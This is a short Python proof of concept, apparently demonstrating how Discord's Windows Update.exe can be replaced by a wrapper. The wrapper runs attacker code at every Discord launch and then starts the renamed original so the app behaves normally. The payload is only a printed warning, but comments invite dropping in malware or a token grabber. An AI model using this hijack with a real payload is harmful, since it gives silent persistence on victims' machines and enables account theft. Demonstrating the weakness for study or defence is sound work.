# This is where the attacker would put any malicious code to be ran on Discord startup.
# Ex: malware, token grabber, etc.

from ntpath import exists
from os import name
from subprocess import run
from sys import argv


def malicious_code() -> None:
    print("Your Discord installation has been compromised!")


def run_discord() -> int:
    # %localappdata%\Discord\Update.bak.exe --processStart discord.exe
    argv[0] = argv[0].replace("Update.exe", "Update.bak.exe")
    if not exists(argv[0]):
        raise SystemExit(0)
    print(f"Executing {' '.join(argv)}")
    return run(argv).returncode


def main() -> None:
    malicious_code()
    code = run_discord()
    input(f"Completed with returncode {code}")


if __name__ == "__main__" and name == "nt":
    main()
